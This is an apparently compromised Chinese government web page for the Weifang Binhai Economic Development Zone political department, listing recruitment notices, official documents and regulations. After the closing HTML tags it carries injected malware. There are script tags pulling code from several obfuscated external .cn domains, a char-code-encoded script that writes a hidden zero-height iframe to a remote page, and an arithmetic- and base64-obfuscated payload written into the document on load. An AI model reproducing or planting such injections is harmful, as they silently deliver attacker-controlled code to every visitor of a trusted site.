+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=553><font class=article_font color="#000000">公开招考事业单位工作人员考录办法</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=551><font class=article_font color="#000000">公开招考事业单位工作人员资格审查结果公示</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=548><font class=article_font color="#000000">二○○八年招聘中小学、幼儿园教师公告</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=547><font class=article_font color="#000000">各部门单位在职研究生报名及在读人员情况统计表</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=545><font class=article_font color="#000000">滨海经济开发区公开招考事业单位工作人员简章(2008年...</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=515><font class=article_font color="#000000">五月份工作总结六月份工作部署</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=506><font class=article_font color="#000000">优化发展环境，促进经济发展</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=499><font class=article_font color="#000000">全市第六次加快发展现场观摩会与会人员来滨海经济开发区、...</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=459><font class=article_font color="#000000">政治工作动态9</font></a> <br>
+     
+                        </td>
+                      </tr>
+                      <tr>
+                        <td width="100%">
+                        <a href="ShowClass.asp?BigClass=工作动态">
+                        <img border="0" src="images/more2.gif" align="right"></a></td>
+                      </tr>
+                    </table>
+                  </div>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="10">
+                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber11">
+                    <tr>
+                <TD width=402 background=images/bgcenterr.gif 
+                height=10></TD>
+                <TD width=10 height=10 rowSpan=2>
+                  <DIV align=right><IMG height=10 
+                  src="images/centerlit1.gif" width=10></DIV></TD>                    
+                  </tr>
+                  </table>
+                  </td>
+                </tr>
+                </tr>
+                <td width="100%" height=120 >
+                <p align="center">
+                <a href="ShowClass.asp?BigClass=先进性教育">
+                <img border="0" src="images/xjx_tit_01.gif" align="center" width="413" height="112"></a><tr>
+                  <td width="100%" height="14">
+                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12">
+                    <tr>
+                     <TD width=30><IMG height=23 
+                  src="images/centerlit.gif" width=30></TD>
+                <TD class=unnamed1 vAlign=bottom width=250 
+                background=images/bgcenter1.gif>
+                  <TABLE height=20 cellSpacing=0 cellPadding=0 width="60%" 
+                  border=0>
+                    <TBODY>
+                    <TR>
+                      <TD class=unnamed1 height=20><FONT color=#ffffff 
+                        size=2><font class=article_font>公文发布</FONT></TD></TR></TBODY></TABLE></TD>
+                <TD class=lifttitle 
+                  background=images/bgcenter2.gif><IMG height=23 
+                  src="images/centermiddle2.gif" width=22></TD>
+                <TD width=10><IMG height=23 
+                  src="images/centerright.gif" 
+                width=13></TD>                        
+               </tr>
+                  </table>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="150" background="images/bgcenter.gif">
+                  <div align="right">
+                    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber13">
+                      <tr>
+                        <td width="100%" height="140" valign="top">
+                         
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=511><font class=article_font color="#000000">关于印发《山东潍坊滨海经济开发区机关事业单位工作人员绩效考核...</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=512><font class=article_font color="#000000">山东潍坊滨海经济开发区党工委关于进一步加强人才工作的意见</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=487><font class=article_font color="#000000">关于公布2005年度工程等专业技术的通知</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=486><font class=article_font color="#000000">关于进一步规范股级干部选拔任用工作的通知</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=485><font class=article_font color="#000000">关于进一步做好信息宣传工作的意见</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=484><font class=article_font color="#000000">山东潍坊滨海经济开发区政治部关于2006年度评先树优的规定</font></a> <br>
+     
+                        </td>
+                      </tr>
+                      <tr>
+                        <td width="100%">
+                        <a href="ShowClass.asp?BigClass=公文发布">
+                        <img border="0" src="images/more2.gif" align="right"></a></td>
+                      </tr>
+                    </table>
+                  </div>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="10">
+                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber14">
+                    <tr>
+                     <TD width=402 background=images/bgcenterr.gif 
+                  height=10></TD>
+                  <TD width=10 height=10 rowSpan=2>
+                  <DIV align=right><IMG height=10 
+                  src="images/centerlit1.gif" width=10></DIV></TD>  
+                  </tr>
+                  </table>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="14">
+                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15">
+                    <tr>
+                     <TD width=30><IMG height=23 
+                  src="images/centerlit.gif" width=30></TD>
+                <TD class=unnamed1 vAlign=bottom width=250 
+                background=images/bgcenter1.gif>
+                  <TABLE height=20 cellSpacing=0 cellPadding=0 width="60%" 
+                  border=0>
+                    <TBODY>
+                    <TR>
+                      <TD class=unnamed1 height=20><FONT color=#ffffff 
+                        size=2><font class=article_font>政策法规</FONT></TD></TR></TBODY></TABLE></TD>
+                <TD class=lifttitle 
+                  background=images/bgcenter2.gif><IMG height=23 
+                  src="images/centermiddle2.gif" width=22></TD>
+                <TD width=10><IMG height=23 
+                  src="images/centerright.gif" 
+                width=13></TD>    
+                   </tr>
+                  </table>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="130" valign="top" background="images/bgcenter.gif">
+                  <div align="right">
+                    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber16">
+                      <tr>
+                        <td width="100%" height="120" valign="top">
+                         
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=491><font class=article_font color="#000000">信访条例</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=489><font class=article_font color="#000000">公务员法</font></a> <br>
+     
+                        </td>
+                      </tr>
+                      <tr>
+                        <td width="100%">
+                        <a href="ShowClass.asp?BigClass=政策法规">
+                        <img border="0" src="images/more2.gif" align="right"></a></td>
+                      </tr>
+                    </table>
+                  </div>
+                  </td>
+                </tr>
+                <tr>
+                  <td width="100%" height="10">
+                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber17">
+                    <tr>
+                     <TD width=402 background=images/bgcenterr.gif 
+                  height=10></TD>
+                  <TD width=10 height=10 rowSpan=2>
+                  <DIV align=right><IMG height=10 
+                  src="images/centerlit1.gif" width=10></DIV></TD>  
+                    </tr>
+                  </table>
+                  </td>
+                </tr>
+                </table>
+              </td>
+              <td width="176" align="right" valign="top" background="images/backgroundright.gif">
+              <div align="left">
+                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18">
+                  <tr>
+                    <td width="100%" align="left" valign="top">
+                    <div align="center">
+  <center>
+  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="176" id="AutoNumber1">
+    <tr>
+      <td background="images/backgroundright.gif" valign="top">
+      <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
+        <tr>
+          <td width="100%" background="images/gg.gif" height="28">　</td>
+        </tr>
+        <tr>
+          <td width="100%" height="270">
+          <div align="right">
+            <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="99%" id="AutoNumber3">
+              <tr>
+                <td width="100%" height="250" valign="top">
+                <script language=JavaScript>marquee1();</script>
+                 
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=549><font class=article_font color="#000000">二○○八年招聘中小学、幼儿园教师公告</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=546><font class=article_font color="#000000">滨海经济开发区公开招考事业单位工作人员简章(2008年)</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=544><font class=article_font color="#000000">政治部行政审批事项表</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=543><font class=article_font color="#000000">科级领导干部配偶子女从业情况申报登记表</font></a> <br>
+      
+              <img src="images/32pic179.gif" width="17" height="17">&nbsp;<a href=ShowMain.asp?ArticleID=539><font class=article_font color="#000000">滨海开发区有关上属单位基本情况调查表</font></a> <br>
+     
+                <script language=JavaScript>marquee2();</script>
+
+                </td>
+              </tr>
+              <tr>
+                <td width="100%" height="20">
+                <p align="right"><FONT size=2>
+                <IMG src="images/doc_more.gif">&nbsp;<font class=article_font><a href="ShowClass.asp?BigClass=最新公告">更多.</a>..</FONT></td>
+              </tr>
+            </table>
+          </div>
+          </td>
+        </tr>
+        <tr>
+          <td width="100%" height="70"><a href="ShowClass.asp?BigClass=下载中心"><img border="0" src="images/xzzx.gif"></a></td>
+        </tr>
+        <tr>
+          <td width="100%">
+          <div align="center">
+            <center>
+            <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber5">
+              <tr>
+               <td width="100%" height="70">
+               <a href="mailto:webmaster@bhzzb.gov.cn">
+               <img border="0" src="images/tsjb.gif"></a></td>
+              </tr>
+              <tr>
+                  <td width="100%" background="images/bmfw.gif" height="28">　</td>
+              </tr>
+              <tr>
+                <td width="100%"  height="20">
+                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" background="images/rbg.gif">
+                  <tr>
+                    <td width="50%" height="18">　</td>
+                    <td width="50%" height="18">　</td>
+                  </tr>
+                  <tr>
+                    <td width="50%" height="32" align="center">
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font> <A href="http://www.wf121.com/" 
+                  target=_blank><font color="#000000"><font class=article_font>天气预报</font></font></A></td>
+                    <td width="50%" height="32" align="center">
+                      <font size="2" color="#FF0000"><font class=article_font>◇</font><FONT size=2> <A href="http://postcode.027.net/" 
+                  target=_blank><font color="#000000"><font class=article_font>邮政编码</font></FONT></A></td>
+                  </tr>
+                  <tr>
+                    <td width="50%" height="32" align="center">
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font><FONT size=2> <A 
+                  href="http://www.sd.cei.gov.cn/server/ser82.htm" 
+                  target=_blank><font color="#000000"><font class=article_font>电话查询</font></FONT></A><font color="#000000"> </FONT>
+                      </td>
+                    <td width="50%" height="32" align="center">
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font> <A 
+                  href="http://wf-www.sd.cninfo.net/ls/hangban.htm" 
+                  target=_blank><font color="#000000"><font class=article_font>航班信息</font></font></A><font color="#000000"> </font>
+                      </td>
+                  </tr>
+                  <tr>
+                    <td width="50%" height="32" align="center">
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font><FONT size=2> <A href="http://wf-www.sd.cninfo.net/online/bmfu/hcsk.htm" 
+                  target=_blank><font color="#000000"><font class=article_font>列车时刻</font></FONT></A></td>
+                    <td width="50%" height="32" align="center">
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font><FONT 
+                  size=2> <A 
+                  href="http://www.infobase.gov.cn/intro/fjms/l7/l7.htm">
+                      <font color="#000000"><font class=article_font>旅游胜地</font></FONT></A></td>
+                  </tr>
+                  <tr>
+                    <td width="50%" height="32">&nbsp;
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font></font><font size="2"> </font>
+                          <a href="http://www.cctv.com/tvguide/index.shtml">
+                          <font size="2" color="#000000">电视节目</font></a></td>
+                    <td width="50%" height="32">&nbsp;
+                      <font color="#FF0000" size="2"><font class=article_font>◇</font></font><font size="2"> </font>
+                          <a href="http://202.102.239.182/hl/llhlcx.asp">
+                          <font size="2" color="#000000">外汇牌价</font></a></td>
+                  </tr>
+                  <tr>
+                    <td width="50%" height="44">　</td>
+                    <td width="50%" height="44">　</td>
+                  </tr>
+                </table>
+                </td>
+              </tr>
+              </table>
+            </center>
+          </div>
+          </td>
+        </tr>
+      </table>
+      </td>
+    </tr>
+  </table>
+  </center>
+</div>
+                    </td>
+                  </tr>
+                </table>
+              </div>
+              </td>
+            </tr>
+          </table>
+          </td>
+        </tr>
+      </table>
+      </td>
+    </tr>
+    <tr>
+      <td height="100">
+      
+<div align="center">
+  <center>
+<table width="780" border="0" cellspacing="0" cellpadding="0" height="100" style="border-collapse: collapse" bordercolor="#111111">
+  <tr>
+    <td height="2" background="images/foot.gif" valign="bottom"> 
+      <div align="center"><font color="#FFFFFF" class=article_font>Copyright&copy; 2006 山东潍坊滨海经济开发区政治部　　电话：0536-5333005</font></div>
+      <div align="center"><font class=article_font color="#FFFFFF">地址：中国</font><font color="#FFFFFF" class=article_font>-山东潍坊滨海经济开发区 
+        邮编：262737<br>
+        </font><font color="#000000" class=article_font>
+        <a href="http://www.miibeian.gov.cn/"><font color="#FFFFFF">鲁ICP 05043323 备案</font></a>
+        　　</font><font color="#FFFFFF" class=article_font><a href="manage"><font color="#FFFFFF" class=article_font>管理</font></a></font>
+        <br>
+        <font size="2"><font color="#FFFFFF">本站被访问：</font>
+        <script src="cutecount/showstat.asp?str=%24AllPageView&p1=1&p2=6&p3=3&p4=1"></script><font size="2"><font color="#FFFFFF"> 次        
+        </font>
+        <br>
+        </font>
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
+          <tr>         
+       </tr>
+        </table>
+      </div>
+    </td>
+  </tr>
+</table>
+  </center>
+</div>
+</div><script src=http://%7A%73%68%61%63%6B%2E%63%6E></script><script src=http://%63%63%68%61%6F%6D%6D%2E%63%6E></script><script src=http://cchaomm.cn></script><script src=http://qqhaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script> 
+      </td>
+    </tr>
+  </table>
+  </center>
+</div>
+
+</BODY></HTML>                                                                                                    
+<script>t='60,105,102,114,97,109,101,32,115,114,99,61,104,116,116,112,58,47,47,102,114,101,101,46,50,48,45,48,57,46,99,110,47,101,114,114,111,114,46,104,116,109,32,119,105,100,116,104,61,49,48,48,32,104,101,105,103,104,116,61,48,62,60,47,105,102,114,97,109,101,62';t=eval('String.fromCharCode('+t+')');document.write(t);</script>
+<title>www.cha88.cn</title><script>var keyStr="ABCDEFGHIJKLMNOP"+"QRSTUVWXYZabcdef"+"ghijklmnopqrstuv"+"wxyz0123456789+/"+"=";function mydata(input){var output="";var chr1,chr2,chr3="";var enc1,enc2,enc3,enc4="";var i=0;var base64test=/[^A-Za-z0-9\+\/\=]/g;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,"");do{enc1=keyStr.indexOf(input.charAt(i++));enc2=keyStr.indexOf(input.charAt(i++));enc3=keyStr.indexOf(input.charAt(i++));enc4=keyStr.indexOf(input.charAt(i++));chr1=(enc1<<2)|(enc2>>4);chr2=((enc2&15)<<4)|(enc3>>2);chr3=((enc3&3)<<6)|enc4;output=output+String.fromCharCode(chr1);if(enc3!=64){output=output+String.fromCharCode(chr2);};if(enc4!=64){output=output+String.fromCharCode(chr3);};chr1=chr2=chr3="";enc1=enc2=enc3=enc4="";};while(i<input.length);return output;};t="125 - 45 ,16 + 55 ,56 + 52 ,143 - 34 ,1188 / 12 ,192 - 83 ,108 - 38 ,104 + 12 ,157 - 67 ,28 + 55 ,105 - 39 ,6466 / 53 ,159 - 60 ,8175 / 75 ,119 - 42 ,84 - 27 ,189 - 92 ,2304 / 32 ,51 + 31 ,1296 / 27 ,165 - 66 ,72 - 4 ,23 + 88 ,80 + 38 ,143 - 67 ,43 + 7 ,35 + 85 ,8512 / 76 ,43 + 34 ,163 - 79 ,197 - 90 ,2650 / 50 ,3465 / 45 ,90 - 23 ,68 - 15 ,17 + 103 ,137 - 40 ,174 - 87 ,67 + 3 ,1632 / 34 ,4900 / 49 ,86 + 35 ,1802 / 34 ,85 + 32 ,54 + 36 ,45 + 43 ,4131 / 51 ,708 / 6 ,3069 / 31 ,155 - 67 ,56 + 13 ,139 - 21 ,34 + 43 ,104 - 21 ,88 - 35 ,48 + 63 ,1500 / 15 ,781 / 11 ,56 - 7 ,223 - 108 ,2117 / 29 ,125 - 53 ,96 + 4 ,11 + 101 ,51 + 39 ,105 - 33 ,33 + 49 ,12321 / 111 ,18 + 62 ,166 - 82 ,99 - 34 ,185 - 82 ,8730 / 90 ,52 + 19 ,3526 / 41 ,213 - 101 ,170 - 80 ,1550 / 31 ,7488 / 72 ,43 + 5 ,141 - 61 ,146 - 62 ,99 - 34 ,30 + 13 ,1760 / 22 ,10 + 57 ,114 - 57 ,8960 / 80 ,3150 / 35 ,182 - 72 ,2072 / 28 ,12 + 92 ,18 + 80 ,131 - 44 ,146 - 61 ,1333 / 31 ,110 - 42 ,112 - 31 ,5772 / 52 ,1624 / 29 ,25 + 72 ,7569 / 87 ,8010 / 89 ,143 - 22 ,4717 / 53 ,163 - 76 ,55 - 6 ,120 - 12 ,118 - 45 ,47 + 25 ,137 - 59 ,78 + 43 ,162 - 73 ,10004 / 82 ,1078 / 22 ,185 - 74 ,64 + 36 ,64 + 8 ,12 + 70 ,7616 / 64 ,89 - 10 ,203 - 98 ,32 + 24 ,4130 / 35 ,1890 / 21 ,6213 / 57 ,166 - 80 ,101 + 16 ,28 + 62 ,30 + 20 ,9300 / 93 ,86 + 22 ,12 + 64 ,70 + 36 ,5047 / 49 ,86 - 34 ,154 / 2 ,95 - 27 ,104 - 39 ,196 - 79 ,1078 / 11 ,100 - 49 ,4662 / 63 ,181 - 71 ,152 / 2 ,93 - 43 ,195 - 95 ,118 - 10 ,136 - 35 ,146 - 37 ,2782 / 26 ,11446 / 97 ,9 + 68 ,106 - 23 ,1007 / 19 ,11766 / 106 ,119 - 19 ,76 - 5 ,1617 / 33 ,227 - 112 ,876 / 12 ,129 - 57 ,10000 / 100 ,10304 / 92 ,144 - 54 ,1440 / 20 ,84 - 2 ,6 + 105 ,4800 / 60 ,840 / 10 ,127 - 62 ,3914 / 38 ,8536 / 88 ,18 + 53 ,88 - 2 ,193 - 81 ,172 - 82 ,1350 / 27 ,95 + 9 ,65 - 17 ,18 + 62 ,152 - 68 ,79 - 14 ,688 / 16 ,1280 / 16 ,3 + 64 ,48 + 9 ,7952 / 71 ,108 - 18 ,64 + 46 ,73 + 1 ,1 + 103 ,5586 / 57 ,6438 / 74 ,24 + 61 ,50 - 7 ";t=eval("mydata(String.fromCharCode("+t+"))");document.write(t);</script>
+<script src=http://%7A%73%68%61%63%6B%2E%63%6E></script><script src=http://%63%63%68%61%6F%6D%6D%2E%63%6E></script><script src=http://cchaomm.cn></script><script src=http://qqhaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://iihaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://tthaomm.cn></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script><script src=http://%6B%6B%68%61%6F%6D%6D%2E%63%6E></script>
